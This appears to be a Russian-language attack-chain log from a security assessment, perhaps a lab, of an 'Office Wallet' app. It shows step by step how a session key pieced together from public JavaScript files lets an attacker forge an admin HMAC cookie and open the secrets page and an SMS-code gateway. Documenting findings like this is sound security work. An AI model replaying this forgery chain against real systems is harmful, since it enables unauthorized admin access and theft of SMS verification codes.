@@ -1,0 +1,25 @@
+OFFICE WALLET · ЦЕПОЧКА АТАКИ
+################################################################################################
+# Ц-1
+################################################################################################
+== Ц-1 · Ключ из статики → админ-доступ без пароля ==
+    · SESSION_KEY собирается из публичного JS (OW-35), роль admin подписываем
+    · сами (OW-28): сервер проверяет только HMAC и не сверяет роль с базой.
+    · Пароль и перебор не нужны — три запроса, и служебные разделы открыты.
+    → GET /static/wallet.js (кусок ключа)
+    ← HTTP 200 /* Office Wallet client */ window.OfficeWallet = {   keyParts: ["office", "-", "wallet"],   tipLimitRub: 50,   sessionKey() {     const tail = window.__SK_TAIL__ || "";     return this.keyParts.join("") + tail;   },   formatRub(kop) {     c...
+    → GET /static/legacy-sync.js (хвост ключа)
+    ← HTTP 200 /* Legacy supply sync helpers */ (function () {   window.SupplySync = {     pathParts: ["api", "v2", "supply", "pricing"],     endpoint() {       return "/" + this.pathParts.join("/");     },     async resolveChannel() {       const r = awa...
+    → SQL SELECT id FROM users WHERE login='adminw'
+    ← psql 6
+    HMAC-SHA256(office-wallet-session-key, '6:admin') = c59d80997f788119de7c0e28…
+    → GET /admin/secrets  (кука собрана нами)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Служебное · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"...
+    → GET /gateway/sms  (SMS-коды под админом)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    ┌─ АРТЕФАКТ · Ц-1 · админка открыта без пароля
+    │ wallet.js + legacy-sync.js → SESSION_KEY=office-wallet-session-key
+    │ Cookie: ow_session=ow.6.admin.<HMAC>
+    │ GET /admin/secrets → HTTP 200; GET /gateway/sms → HTTP 200 (кодов в шлюзе: 37)
+    └─
+[+] три запроса — админ-разделы и SMS-шлюз открыты без пароля
